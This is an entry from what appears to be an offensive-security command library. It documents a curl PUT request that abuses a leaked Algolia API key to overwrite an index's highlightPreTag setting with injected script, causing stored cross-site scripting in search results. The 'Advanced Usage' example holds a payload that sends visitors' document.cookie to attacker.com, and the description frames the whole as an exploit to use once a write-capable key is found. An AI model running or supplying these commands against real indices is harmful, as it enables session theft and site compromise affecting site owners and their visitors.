---
id: ab2c7ff3-af83-4077-98f9-aa5868e9f484
name: curl-set-algolia-highlight-pre-tag
type: command
executor: bash
data: >-
  curl --request PUT \n  --url
  https://$_APPLICATION_ID-1.algolianet.com/1/indexes/$_INDEX_NAME/settings \n 
  --header 'content-type: application/json' \n  --header 'x-algolia-api-key:
  $_API_KEY' \n  --header 'x-algolia-application-id: $_APPLICATION_ID' \n 
  --data '{"highlightPreTag": "$_MALICIOUS_PAYLOAD"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
  - Windows (with curl)
tags:
  - api
  - exploit
  - xss
verified: true
validated: true
---

# curl-set-algolia-highlight-pre-tag

## Command

```bash
curl --request PUT \
  --url https://$_APPLICATION_ID-1.algolianet.com/1/indexes/$_INDEX_NAME/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: $_API_KEY' \
  --header 'x-algolia-application-id: $_APPLICATION_ID' \
  --data '{"highlightPreTag": "$_MALICIOUS_PAYLOAD"}'
```

## Description

This command uses curl to send a PUT request to the Algolia API, updating the settings of a specified search index to inject a malicious highlight pre-tag. This can enable XSS by embedding JavaScript in search result highlights. Use this in scenarios where a leaked API key grants write access to indices.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_APPLICATION_ID | The Algolia application ID (e.g., 'ABC123DEF') | Yes |
| $_INDEX_NAME | The name of the target search index (e.g., 'users' or 'products') | Yes |
| $_API_KEY | The leaked Algolia API key with write permissions | Yes |
| $_MALICIOUS_PAYLOAD | The HTML/JavaScript to inject (e.g., '<script>alert(1);</script>') | Yes |
| --request PUT | Specifies the HTTP method for updating settings | Built-in |
| --header 'content-type: application/json' | Sets the request body format to JSON | Built-in |
| --header 'x-algolia-api-key: $_API_KEY' | Authenticates the request with the API key | Built-in |
| --header 'x-algolia-application-id: $_APPLICATION_ID' | Identifies the application | Built-in |
| --data | The JSON payload to update settings | Built-in |

## Examples

### Basic Usage

```bash
curl --request PUT \
  --url https://ABC123DEF-1.algolianet.com/1/indexes/users/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: leaked_key_here' \
  --header 'x-algolia-application-id: ABC123DEF' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```

### Advanced Usage

For a more stealthy payload that exfiltrates data:

```bash
curl --request PUT \
  --url https://ABC123DEF-1.algolianet.com/1/indexes/users/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: leaked_key_here' \
  --header 'x-algolia-application-id: ABC123DEF' \
  --data '{"highlightPreTag": "<script>fetch(\'https://attacker.com/exfil?data=\' + document.cookie);</script>"}'
```

## Expected Output

Successful execution returns an HTTP 200 OK response with JSON confirming the updated settings:

```json
{
  "highlightPreTag": "<script>alert(1);</script>",
  "taskID": 123456789
}
```

Look for the taskID to confirm the update was queued. Errors (e.g., 403 Forbidden) indicate invalid key or permissions.

## Related

- [[Related Procedure]]: [[procedures/Exploit-Leaked-Algolia-API-Key-for-Highlight-Pre-Tag-Injection]]
- [[Related Tool]]: Standard curl usage, no specific tool.
